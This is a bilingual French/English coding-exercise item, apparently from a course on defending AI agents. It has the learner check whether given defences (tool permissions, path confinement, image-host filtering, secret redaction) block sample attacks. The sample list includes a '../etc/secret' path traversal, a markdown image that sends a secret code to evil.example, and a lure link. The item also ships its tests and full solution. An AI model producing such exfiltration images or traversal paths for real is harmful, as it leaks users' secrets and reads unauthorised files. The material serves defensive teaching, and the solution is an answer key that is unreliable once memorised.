- id: c4
  type: code
  note:
    kind: exercise
    poids: 1
  fr: 'À toi. **Écris `bloque(attaque)`** : si l’attaque a une clé `"action"`, renvoie `True` quand `decision(outil, args, PERMISSIONS, RACINE)` vaut `"refuser"`. Sinon (une `"sortie"`), calcule `nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])` et renvoie `True` si `nettoye` diffère de `texte`. Toutes les défenses sont fournies.'
  en: 'Your turn. **Write `bloque(attaque)`**: if the attack has an `"action"` key, return `True` when `decision(outil, args, PERMISSIONS, RACINE)` is `"refuser"`. Otherwise (an `"sortie"`), compute `nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])` and return `True` if `nettoye` differs from `texte`. All defences are provided.'
  depart: |
    import posixpath
    import re
    import urllib.parse

    RACINE = "/data"
    PERMISSIONS = {"lire": "auto", "ecrire": "confirmer"}
    HOTES = ["exemple.org"]

    def chemin_autorise(racine, chemin):
        complet = posixpath.normpath(posixpath.join(racine, chemin))
        base = racine.rstrip("/")
        return complet == base or complet.startswith(base + "/")

    def decision(nom, args, permissions, racine):
        niveau = permissions.get(nom, "refuser")
        if niveau == "refuser":
            return "refuser"
        if "chemin" in args and not chemin_autorise(racine, args["chemin"]):
            return "refuser"
        return niveau

    def retirer_images(texte, hotes_autorises):
        def remplacer(m):
            hote = urllib.parse.urlparse(m.group(2)).hostname
            return m.group(0) if hote in hotes_autorises else "[image retirée]"
        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)

    def filtrer_sortie(texte, secrets):
        for s in secrets:
            texte = texte.replace(s, "[SECRET]")
        return texte

    ATTAQUES = [
        {"nom": "chemin piégé", "action": {"outil": "lire", "args": {"chemin": "../etc/secret"}}},
        {"nom": "outil interdit", "action": {"outil": "supprimer", "args": {"chemin": "a.txt"}}},
        {"nom": "fuite par image", "sortie": "Bonjour ![](https://evil.example/x?d=code-1234)"},
        {"nom": "fuite du secret", "sortie": "Le code est code-1234"},
        {"nom": "action légitime", "action": {"outil": "lire", "args": {"chemin": "notes.txt"}}},
        {"nom": "lien piégé", "sortie": "Clique ici : [aide](https://evil.example/hameçon)"},
    ]

    # écris ta fonction bloque ici
  tests: |-
    r = {a["nom"]: bloque(a) for a in ATTAQUES}
    assert r["chemin piégé"] is True and r["outil interdit"] is True
    assert r["fuite par image"] is True and r["fuite du secret"] is True
    assert r["action légitime"] is False
    assert r["lien piégé"] is False
  solutionCode: |
    import posixpath
    import re
    import urllib.parse

    RACINE = "/data"
    PERMISSIONS = {"lire": "auto", "ecrire": "confirmer"}
    HOTES = ["exemple.org"]

    def chemin_autorise(racine, chemin):
        complet = posixpath.normpath(posixpath.join(racine, chemin))
        base = racine.rstrip("/")
        return complet == base or complet.startswith(base + "/")

    def decision(nom, args, permissions, racine):
        niveau = permissions.get(nom, "refuser")
        if niveau == "refuser":
            return "refuser"
        if "chemin" in args and not chemin_autorise(racine, args["chemin"]):
            return "refuser"
        return niveau

    def retirer_images(texte, hotes_autorises):
        def remplacer(m):
            hote = urllib.parse.urlparse(m.group(2)).hostname
            return m.group(0) if hote in hotes_autorises else "[image retirée]"
        return re.sub(r"!\[([^\]]*)\]\(([^)]+)\)", remplacer, texte)

    def filtrer_sortie(texte, secrets):
        for s in secrets:
            texte = texte.replace(s, "[SECRET]")
        return texte

    ATTAQUES = [
        {"nom": "chemin piégé", "action": {"outil": "lire", "args": {"chemin": "../etc/secret"}}},
        {"nom": "outil interdit", "action": {"outil": "supprimer", "args": {"chemin": "a.txt"}}},
        {"nom": "fuite par image", "sortie": "Bonjour ![](https://evil.example/x?d=code-1234)"},
        {"nom": "fuite du secret", "sortie": "Le code est code-1234"},
        {"nom": "action légitime", "action": {"outil": "lire", "args": {"chemin": "notes.txt"}}},
        {"nom": "lien piégé", "sortie": "Clique ici : [aide](https://evil.example/hameçon)"},
    ]

    def bloque(attaque):
        if "action" in attaque:
            a = attaque["action"]
            return decision(a["outil"], a["args"], PERMISSIONS, RACINE) == "refuser"
        texte = attaque["sortie"]
        nettoye = filtrer_sortie(retirer_images(texte, HOTES), ["code-1234"])
        return nettoye != texte
  indice:
    fr: 'Deux branches : `if "action" in attaque` avec la `decision`, sinon le nettoyage de la `sortie` comparé au texte d’origine.'
    en: 'Two branches: `if "action" in attaque` with the `decision`, otherwise the cleaning of the `sortie` compared with the original text.'
  explication:
    fr: 'Remarque : l’attaque « lien piégé » n’est **pas** bloquée, car aucune défense ne regarde les liens cliquables.'
    en: 'Note: the “trapped link” attack is **not** blocked, because no defence looks at clickable links.'
